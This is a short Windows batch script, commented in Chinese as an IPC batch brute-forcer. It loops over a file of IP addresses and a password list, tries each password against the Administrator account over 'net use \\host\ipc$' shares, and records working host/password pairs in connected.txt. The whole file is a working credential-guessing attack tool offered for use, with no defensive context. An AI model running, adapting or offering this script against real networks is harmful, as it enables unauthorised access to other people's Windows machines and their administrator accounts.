@echo off
::IPC批量爆破
cls
echo Useage: %0 ip.txt pass.txt
echo [+]Scanning...
for /f %%t in (%1) do (
FOR /F "eol=; tokens=1,2,3* delims=, " %%i in (%2) do (
echo net use \\%%t\ipc$ "%%i" /user:"localhost\Administrator" >> log.txt
net use \\%%t\ipc$ "%%i" /user:"localhost\Administrator"  >NUL 2>NUL
IF NOT errorlevel 1 (
echo %%i  t:%%t>> connected.txt
net use \\%%t\ipc$ /del
)
net use * /del /y >NUL 2>NUL
)
)
echo [+]Scan has ended.